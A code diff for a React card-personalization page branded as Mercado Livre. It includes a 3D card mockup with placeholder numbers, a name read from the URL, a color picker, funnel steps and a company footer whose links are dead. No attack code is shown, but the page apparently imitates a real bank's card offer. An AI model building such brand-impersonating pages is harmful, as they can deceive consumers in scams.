@@ -2,9 +2,9 @@ import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useState } from "react";
 import mlLogo from "@/assets/mercado-livre-logo.png";
 import { FunnelSteps } from "@/components/FunnelSteps";
-import cardBg from "@/assets/card-bg.png";
-
-
+import mlHandshake from "@/assets/ml-handshake-white.png";
+import mastercard from "@/assets/mastercard.png";
+import cardChip from "@/assets/card-chip.png";
 
 export const Route = createFileRoute("/personalizar")({
   head: () => ({
@@ -36,8 +36,7 @@ function Personalizar() {
   // Get name from URL query string
   const nome =
     typeof window !== "undefined"
-      ? new URLSearchParams(window.location.search).get("nome")?.toUpperCase() ||
-        "NOME DO TITULAR"
+      ? new URLSearchParams(window.location.search).get("nome")?.toUpperCase() || "NOME DO TITULAR"
       : "NOME DO TITULAR";
 
   return (
@@ -53,38 +52,98 @@ function Personalizar() {
             Personalize o seu cartão
           </h1>
 
-          {/* Credit card preview - 3D rotating (portrait, flat color like reference) */}
+          {/* Credit card preview - 3D rotating */}
           <div className="card-3d-scene mb-6 flex justify-center">
             <div className="card-3d-rotator relative w-[62%] max-w-[260px] aspect-[1/1.586]">
-              {/* FRONT - apenas imagem de referência */}
+              {/* FRONT */}
               <div
                 className="card-3d-face absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
                 style={{
                   backgroundColor: card.value,
-                  backgroundImage: `url(${cardBg})`,
-                  backgroundSize: "cover",
-                  backgroundPosition: "center",
-                  backgroundRepeat: "no-repeat",
+                  backgroundImage:
+                    "linear-gradient(90deg, rgba(0,0,0,.26) 0 17%, rgba(0,0,0,0) 17%), radial-gradient(circle at 78% 31%, rgba(255,255,255,.16), transparent 36%), linear-gradient(160deg, rgba(255,255,255,.10), rgba(0,0,0,.18))",
                 }}
-              />
+              >
+                <div className="absolute inset-y-0 left-0 w-[17%] bg-black/18" />
+                <img
+                  src={mlHandshake}
+                  alt="Mercado Livre"
+                  className="absolute top-5 left-[26%] w-11 h-auto"
+                />
+                <span
+                  className={`absolute top-8 right-6 text-[10px] font-semibold tracking-[0.16em] ${platinumColor}`}
+                >
+                  PLATINUM
+                </span>
+                <img
+                  src={cardChip}
+                  alt="Chip"
+                  className="absolute top-[31%] left-[24%] w-9 h-auto"
+                />
+                <svg
+                  className={`absolute top-[32%] left-[43%] w-6 h-6 ${subTextColor}`}
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="1.8"
+                  strokeLinecap="round"
+                >
+                  <path d="M6.5 8.5a5 5 0 0 1 0 7" />
+                  <path d="M10 6a8.5 8.5 0 0 1 0 12" />
+                  <path d="M13.5 3.8a12 12 0 0 1 0 16.4" />
+                </svg>
+                <div
+                  className={`absolute right-5 top-[39%] text-right font-mono text-lg leading-[1.38] tracking-[0.08em] ${textColor}`}
+                >
+                  <div>1234</div>
+                  <div className="border-y border-current/75 py-0.5">5678</div>
+                  <div>9101</div>
+                  <div>1213</div>
+                </div>
+                <div
+                  className={`absolute right-5 top-[73%] flex items-end gap-2 text-right font-mono ${textColor}`}
+                >
+                  <span className="text-[6px] leading-[.9] opacity-80">
+                    EXP.
+                    <br />
+                    DATE
+                  </span>
+                  <span className="text-[10px] tracking-[0.08em]">05/31</span>
+                </div>
+                <div
+                  className={`absolute left-[24%] bottom-10 max-w-[48%] truncate text-[10px] font-medium tracking-[0.12em] ${textColor}`}
+                >
+                  {nome}
+                </div>
+                <img
+                  src={mastercard}
+                  alt="Mastercard"
+                  className="absolute bottom-6 right-5 w-12 h-auto"
+                />
+              </div>
 
               {/* BACK */}
               <div
                 className="card-3d-face card-3d-back absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
                 style={{
                   backgroundColor: card.value,
-                  backgroundImage: `url(${cardBg})`,
-                  backgroundSize: "cover",
-                  backgroundPosition: "center",
+                  backgroundImage:
+                    "linear-gradient(90deg, rgba(0,0,0,.26) 0 17%, rgba(0,0,0,0) 17%), linear-gradient(160deg, rgba(255,255,255,.10), rgba(0,0,0,.18))",
                 }}
-              />
-
-
-
+              >
+                <div className="absolute inset-y-0 left-0 w-[17%] bg-black/18" />
+                <div className="absolute left-0 right-0 top-7 h-11 bg-black/80" />
+                <div className="absolute right-5 top-[34%] h-8 w-16 rounded-sm bg-white/95 px-2 py-1 text-right font-mono text-sm text-gray-900">
+                  123
+                </div>
+                <div
+                  className={`absolute bottom-5 right-5 text-[10px] font-semibold tracking-[0.08em] ${textColor}`}
+                >
+                  mercadolivre.com
+                </div>
+              </div>
             </div>
           </div>
-
-
 
           {/* Color picker */}
           <div className="flex justify-center gap-4 mb-6">
@@ -94,12 +153,22 @@ function Personalizar() {
                 onClick={() => setSelected(i)}
                 aria-label={`Cor ${c.name}`}
                 className={`w-10 h-10 rounded-full flex items-center justify-center shadow-md transition-all ${
-                  selected === i ? "ring-2 ring-offset-2 ring-[#F4D147] scale-110" : "hover:scale-105"
+                  selected === i
+                    ? "ring-2 ring-offset-2 ring-[#F4D147] scale-110"
+                    : "hover:scale-105"
                 }`}
                 style={{ backgroundColor: c.value }}
               >
                 {selected === i && (
-                  <svg viewBox="0 0 24 24" className={`w-5 h-5 ${c.value === "#F4D147" ? "text-gray-800" : "text-white"}`} fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                  <svg
+                    viewBox="0 0 24 24"
+                    className={`w-5 h-5 ${c.value === "#F4D147" ? "text-gray-800" : "text-white"}`}
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="3"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
                     <polyline points="20 6 9 17 4 12" />
                   </svg>
                 )}
@@ -120,8 +189,13 @@ function Personalizar() {
         <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
         <p className="mt-1">
           CNPJ: 10.573.521/0001-91 ·{" "}
-          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
-          <a href="#" className="text-gray-900">Privacidade</a>
+          <a href="#" className="text-gray-900">
+            Termos e condições
+          </a>{" "}
+          ·{" "}
+          <a href="#" className="text-gray-900">
+            Privacidade
+          </a>
         </p>
       </footer>
     </div>
